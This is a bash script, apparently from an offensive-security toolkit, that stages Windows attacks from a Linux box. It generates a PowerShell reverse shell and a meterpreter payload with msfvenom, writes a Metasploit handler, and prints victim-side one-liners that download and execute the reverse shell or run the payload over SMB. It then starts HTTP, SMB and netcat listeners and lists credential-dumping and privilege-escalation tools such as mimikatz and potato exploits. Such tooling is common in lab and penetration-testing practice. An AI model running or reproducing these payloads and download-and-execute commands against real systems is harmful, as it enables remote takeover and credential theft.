#!/bin/bash
# coding:UTF-8

# -------------------------------------------------------------------------------------
#                                WINDOWS HTTP SERVER
#                BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)
# -------------------------------------------------------------------------------------

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 2.0                                                                
# Details : Create two universal system files - payload.exe and reverseshell.ps1
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

filename="file.txt"
ifconfig tun0 | grep 'inet ' | awk '{print $2}' | sed 's/addr://' > $filename

cp template.txt reverseshell.ps1

while read line
  do 
  echo "Invoke-PowerShellTcp -Reverse -IPAddress $line -Port 9001" >> ./reverseshell.ps1
  mv reverseshell.ps1 ./APT/reverseshell.ps1
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$line LPORT=4444 --platform windows -f exe -o ./APT/meterpreter.exe
done < $filename

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 2.0                                                                
# Details : Create auto startup for msfconsole.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

if [ -f ./meterpreter.rc ]
then
   rm meterpreter.rc
else
   touch meterpreter.rc
fi
echo use exploit/multi/handler >> meterpreter.rc
echo set PAYLOAD windows/meterpreter/reverse_tcp >> meterpreter.rc
while read line
   do
   echo set LHOST $line >> meterpreter.rc
done < $filename
echo set ExitOnSession false >> meterpreter.rc
echo clear >> meterpreter.rc
echo show options >> meterpreter.rc
echo run >> meterpreter.rc

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 2.0                                                                
# Details : Display my universal banner.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

xdotool key Alt+Shift+S; xdotool type "HTTP Server"; xdotool key Return
clear
echo "\t\t__        _____ _   _ ____   _____        ______    _   _ _____ _____ ____    ____  _____ ______     _______ ____   "
echo "\t\t\ \      / /_ _| \ | |  _ \ / _ \ \      / / ___|  | | | |_   _|_   _|  _ \  / ___|| ____|  _ \ \   / / ____|  _ \  "
echo "\t\t \ \ /\ / / | ||  \| | | | | | | \ \ /\ / /\___ \  | |_| | | |   | | | |_) | \___ \|  _| | |_) \ \ / /|  _| | |_) | "
echo "\t\t  \ V  V /  | || |\  | |_| | |_| |\ V  V /  ___) | |  _  | | |   | | |  __/   ___) | |___|  _ < \ V / | |___|  _ <  "
echo "\t\t   \_/\_/  |___|_| \_|____/ \___/  \_/\_/  |____/  |_| |_| |_|   |_| |_|     |____/|_____|_| \_\ \_/  |_____|_| \_\ "
echo "\t\t                                                                                                                    "
echo "\t\t                                BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)                               \n"

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 2.0                                                             
# Details : Start the HTTP Server.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

echo '\e[1;33m'Startup Instructions:'\e[0m'
echo "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted\n"
echo '\e[1;33m'Special Instructions:'\e[0m'
while read line
  do 
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:80/APT/reverseshell.ps1)'\""
  printf "C:\Windows\System32\cmd.exe /c \\\\\\\\$line\APT\meterpreter.exe\n\n"
  echo '\e[1;33m'Normal Usage:'\e[0m'
  echo "powershell \"iwr -Uri http://$line:80/APT/filename\" -outfile filename"
done < $filename

echo "\nENUMERATION			SHELLS				RUNNING PROCESSES		COMMUNICATIONS			CORE EXPLOITS		"
echo "----------------------------------------------------------------------------------------------------------------------------------------------------------"
echo "jawsenum.ps1			meterpreter.exe			powerup.ps1			nc64.exe			mimidump.ps1            "
echo "sharphound.ps1			webshell.php			powercat.ps			plink64.exe			mimikatz.ps1		"
echo "sharphound.exe			myshell.php			powerview.ps1			chisel64.exe			winpwn.ps1		"
echo "winpeas32.exe			image.php.jpg			powermad.ps1			test_clsid.bat			lovelypotato.ps1	"
echo "winpeas64.exe							procdump32.exe			rogueoxidresolver.exe		roguepotato.exe		"
echo "rubeus.exe							procdump64.exe							mimikatz64.exe		"
echo "nmapsetup.exe															mimikatz32.exe          "
echo "----------------------------------------------------------------------------------------------------------------------------------------------------------"

echo "[+] Starting Meterpreter..."
xdotool key Ctrl+Shift+T; sleep 2
xdotool key Alt+Shift+S; xdotool type "Meterpreter"; xdotool key Return; sleep 2
xdotool type "msfconsole -r meterpreter.rc"; xdotool key Return

echo "[+] Starting SMB Server..."
xdotool key Ctrl+Shift+T; sleep 2
xdotool key Alt+Shift+S; xdotool type "SMB Server"; xdotool key Return; sleep 2
xdotool type "impacket-smbserver C:\tmp ./APT/ -smb2support"; xdotool key Return

echo "[+] Starting HTTP server..."
xdotool key Ctrl+Tab; sleep 2
xdotool key Ctrl+Shift+Tab; sleep 2
echo '\e[1;32m'Running...'\e[0m'
python3 -m http.server 80 > output.txt
rlwrap nc -nvlp 9001

#Eof
